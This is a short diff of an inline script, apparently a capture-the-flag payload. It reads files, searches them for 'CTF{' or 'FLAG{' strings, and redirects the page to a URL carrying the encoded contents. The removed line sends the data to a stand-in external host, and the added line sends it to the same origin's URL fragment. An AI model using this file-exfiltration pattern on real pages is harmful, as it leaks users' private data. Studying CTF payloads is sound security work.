@@ -31,7 +31,7 @@
         if (!e.file) continue;
         const t = await e.file.text();
         if (/CTF\\{|FLAG\\{/i.test(t)) {
-          location.href = "https://example.com/#" + encodeURIComponent(t);
+          location.href = "/#"+encodeURIComponent(t);
           return;
         }
       }
@@ -57,3 +57,4 @@
   };
 })();
 </script>
+
